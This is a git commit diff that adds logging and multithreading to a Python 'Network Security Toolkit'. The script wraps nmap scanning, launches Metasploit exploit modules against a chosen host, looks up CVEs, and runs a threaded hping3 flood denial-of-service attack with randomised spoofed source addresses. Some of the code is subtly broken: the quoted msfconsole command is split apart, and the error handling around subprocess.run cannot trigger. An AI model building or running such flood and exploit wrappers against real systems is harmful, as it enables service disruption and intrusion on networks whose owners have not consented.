344b5440d9a238826393268d484a16afafe7f3ea
Philip Esterhuizen <stolenfuture314@gmail.com>
2023-05-25 00:51:08 +0200

    Added Multi Threading

--- main.py
+++ main.py
@@ -3,30 +3,52 @@ import requests
 import subprocess
 import sys
 import time
+import logging
+import threading
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 def scan_with_nmap(target, use_udp):
     scan_type = "-sU" if use_udp else "-sT"
     nmap_cmd = f"sudo nmap -Pn {scan_type} -sC -sV {target}"
-    output = subprocess.check_output(nmap_cmd.split())
-    print(output.decode())
+
+    try:
+        output = subprocess.check_output(nmap_cmd.split())
+        logger.info(output.decode())
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Error executing Nmap scan: {e}")
 
 def run_metasploit_exploit(target, exploit):
     metasploit_cmd = f"sudo msfconsole -x 'use {exploit}; set RHOST {target}; run;'"
-    output = subprocess.check_output(metasploit_cmd.split())
-    print(output.decode())
+
+    try:
+        output = subprocess.check_output(metasploit_cmd.split())
+        logger.info(output.decode())
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Error executing Metasploit exploit: {e}")
 
 def gather_network_info(target):
     info_cmd = f"sudo nmap -A {target}"
-    output = subprocess.check_output(info_cmd.split())
-    print(output.decode())
+
+    try:
+        output = subprocess.check_output(info_cmd.split())
+        logger.info(output.decode())
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Error gathering network information: {e}")
 
 def perform_dos_attack(target, packets, interval, port, use_udp):
     dos_cmd = f"sudo hping3 -c {packets} -i u{interval} -p {port} --rand-source {'-2' if use_udp else ''} --flood {target}"
     start_time = time.time()
-    subprocess.run(dos_cmd.split())
-    end_time = time.time()
-    duration = end_time - start_time
-    print(f"Finished DoS attack in {duration:.2f} seconds")
+
+    try:
+        subprocess.run(dos_cmd.split())
+        end_time = time.time()
+        duration = end_time - start_time
+        logger.info(f"Finished DoS attack in {duration:.2f} seconds")
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Error performing DoS attack: {e}")
 
 def get_known_cves(target):
     api_url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={target}"
@@ -38,16 +60,24 @@ def get_known_cves(target):
             cves = data["result"].get("CVE_Items", [])
 
             if len(cves) > 0:
-                print(f"Found {len(cves)} known CVE(s) for {target}:")
+                logger.info(f"Found {len(cves)} known CVE(s) for {target}:")
                 for cve in cves:
                     cve_id = cve["cve"]["CVE_data_meta"]["ID"]
-                    print("- " + cve_id)
+                    logger.info("- " + cve_id)
             else:
-                print("No known CVEs found for the target.")
+                logger.info("No known CVEs found for the target.")
         else:
-            print("Error: Unable to retrieve CVE information.")
+            logger.error("Error: Unable to retrieve CVE information.")
     except requests.exceptions.RequestException as e:
-        print("Error: Failed to connect to the NVD API.")
+        logger.error("Error: Failed to connect to the NVD API.")
+
+def perform_dos_attack_threaded(target, packets, interval, port, use_udp):
+    dos_thread = threading.Thread(target=perform_dos_attack, args=(target, packets, interval, port, use_udp))
+    dos_thread.start()
+
+def get_known_cves_threaded(target):
+    cves_thread = threading.Thread(target=get_known_cves, args=(target,))
+    cves_thread.start()
 
 def main():
     parser = argparse.ArgumentParser(description="Network Security Toolkit")
@@ -75,11 +105,11 @@ def main():
     elif args.choice == "4":
         if not args.target or not args.packets:
             parser.error("Please provide both the target IP or hostname and the number of packets.")
-        perform_dos_attack(args.target, args.packets, args.interval, args.port, args.udp)
+        perform_dos_attack_threaded(args.target, args.packets, args.interval, args.port, args.udp)
     elif args.choice == "5":
         if not args.target:
             parser.error("Please provide the target IP or hostname.")
-        get_known_cves(args.target)
+        get_known_cves_threaded(args.target)
     elif args.choice == "6":
         print("Goodbye!")
         sys.exit(0)
